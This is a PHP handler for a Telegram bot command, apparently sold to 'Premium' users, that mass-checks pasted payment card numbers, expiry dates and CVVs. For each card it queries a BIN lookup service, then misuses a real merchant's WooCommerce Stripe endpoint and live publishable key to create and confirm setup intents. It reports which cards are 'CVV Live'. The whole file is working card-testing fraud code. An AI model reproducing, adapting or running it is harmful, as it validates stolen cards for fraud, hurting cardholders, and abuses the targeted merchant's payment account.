<?php
if (preg_match('/^(\/mb3|\.mb3|!mb3)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>@$username You're not Premium user❌</b>", $message_id);
        exit();
    }

    $start_time = microtime(true);
    
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>MASS CHECKING STARTED...</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);

    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');
    
    // Extract cards from message
    $cards = explode("\n", substr($message, 4));
    $total_cards = count($cards);
    $approved = 0;
    $declined = 0;
    $cvc_check = 0;
    $unknown = 0;
    $response = "";

    foreach ($cards as $card) {
        // Skip empty lines
        if (empty(trim($card))) continue;
        
        $card = trim($card);
        $lista = explode("|", $card);
        
        if (count($lista) != 4) {
            $response .= "❌ Invalid card format: $card\n";
            $unknown++;
            continue;
        }
        
        $cc = trim($lista[0]);
        $mes = trim($lista[1]);
        $ano = trim($lista[2]);
        $cvv = trim($lista[3]);
        
        if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
        
        // Get card info
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        ));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        
        //==================[BIN LOOK-UP-END]======================//
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.com/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe_cc');
        $result1 = curl_exec($ch);
        $client = Getstr($result1,'"client_secret":"','"');
        $pi = Getstr($result1,'"client_secret":"','_secret');

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        
        if (strpos($result2, '"status": "succeeded"')) {
            $approved++;
            $response .= "✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖: <code>$cc|$mes|$ano|$cvv</code>
[↯] 𝗚𝗔𝗧𝗘𝗦: <code>Braintree Auth</code>
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: <code>$msg2 CVV Live 🟢</code>
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗮𝗻𝗸: <code>$bank $brand</code>
[↯] 𝗕𝗿𝗮𝗻𝗱: <code>$scheme</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>$name $emoji</code>
━━━━━━━━━━━━━━━━\n\n";
        } 
        elseif ((empty($client)) || (empty($pi))) {
            $declined++;
            $response .= "❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖: <code>$cc|$mes|$ano|$cvv</code>
[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree Auth
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Duplicate card exists in the vault
━━━━━━━━━━━━━━━━\n\n";
        }
        else {
            $declined++;
            $response .= "❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖: <code>$cc|$mes|$ano|$cvv</code>
[↯] 𝗚𝗔𝗧𝗘𝗦: <code>Braintree Auth</code>
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: <code>$msg2</code>
━━━━━━━━━━━━━━━━\n\n";
        }
        
        // Update status after each card
        $end_time = microtime(true);
        $time = number_format($end_time - $start_time, 2);
        
        $status = "𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡️\n";
        $status .= "━━━━━━━━━━━━━━━━\n";
        $status .= "[↯] 𝗧𝗼𝘁𝗮𝗹: $total_cards\n";
        $status .= "[↯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: $approved\n";
        $status .= "[↯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: $declined\n";
        $status .= "[↯] 𝗧𝗶𝗺𝗲: $time seconds\n";
        $status .= "━━━━━━━━━━━━━━━━\n\n";
        $status .= $response;
        
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => $status,
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        
        // Sleep to avoid rate limiting
        usleep(100000); // 100ms delay
    }
}
?>